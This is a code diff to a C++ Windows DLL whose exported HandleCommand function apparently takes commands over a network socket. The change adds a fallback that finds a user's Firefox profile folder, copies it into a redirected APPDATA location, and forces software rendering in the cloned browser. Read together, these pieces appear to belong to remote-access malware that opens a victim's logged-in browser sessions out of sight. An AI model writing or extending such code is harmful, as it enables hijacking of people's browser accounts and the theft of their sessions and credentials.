@@ -1776,6 +1776,40 @@ static wstring get_firefox_real_profile_path(const wstring& sourceUserData) {
     return L"";
 }
 
+static wstring find_gecko_profile_fallback(const wstring& sourceUserData) {
+    wstring profilesPath = sourceUserData + L"\\Profiles";
+    if (fs::exists(profilesPath)) {
+        wstring bestDir = L"";
+        WIN32_FIND_DATAW findData;
+        HANDLE hFind = FindFirstFileW((profilesPath + L"\\*").c_str(), &findData);
+        if (hFind != INVALID_HANDLE_VALUE) {
+            do {
+                wstring name = findData.cFileName;
+                if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
+                    name != L"." && name != L"..") {
+                    wstring candidate = profilesPath + L"\\" + name;
+                    // Prefer folders ending with .default-release or .default
+                    if (name.rfind(L".default-release") != wstring::npos) {
+                        bestDir = candidate;
+                        break;
+                    }
+                    if (name.rfind(L".default") != wstring::npos) {
+                        bestDir = candidate;
+                    }
+                    if (bestDir.empty()) {
+                        bestDir = candidate;
+                    }
+                }
+            } while (FindNextFileW(hFind, &findData));
+            FindClose(hFind);
+        }
+        if (!bestDir.empty()) {
+            return bestDir;
+        }
+    }
+    return L"";
+}
+
 static wstring get_browser_profile_path(const wstring& browserName) {
     wchar_t szPath[MAX_PATH];
     if (browserName == L"Opera" || browserName == L"Opera GX") {
@@ -2174,6 +2208,9 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                                 return;
                             }
                             profilePath = get_firefox_real_profile_path(destPath);
+                            if (profilePath.empty()) {
+                                profilePath = find_gecko_profile_fallback(destPath);
+                            }
 
                             // Redirect APPDATA environment variable
                             SetEnvironmentVariableW(L"APPDATA", tempProfileRoot.c_str());
@@ -2216,6 +2253,9 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                             wstring sourceUserData = get_gecko_profile_path(wRequestedPath);
                             if (!sourceUserData.empty() && fs::exists(sourceUserData)) {
                                 wstring realProfilePath = get_firefox_real_profile_path(sourceUserData);
+                                if (realProfilePath.empty()) {
+                                    realProfilePath = find_gecko_profile_fallback(sourceUserData);
+                                }
                                 if (!realProfilePath.empty()) {
                                     profilePath = realProfilePath;
                                 } else {
@@ -2309,7 +2349,10 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                                 FILE* f = _wfopen(userJsPath.wstring().c_str(), L"a");
                                 if (f) {
                                     fputs("user_pref(\"gfx.webrender.force-disabled\", true);\n", f);
+                                    fputs("user_pref(\"gfx.webrender.all\", false);\n", f);
+                                    fputs("user_pref(\"gfx.webrender.software\", true);\n", f);
                                     fputs("user_pref(\"layers.acceleration.disabled\", true);\n", f);
+                                    fputs("user_pref(\"layers.acceleration.force-enabled\", false);\n", f);
                                     fputs("user_pref(\"media.hardware-video-decoding.enabled\", false);\n", f);
                                     fclose(f);
                                 }
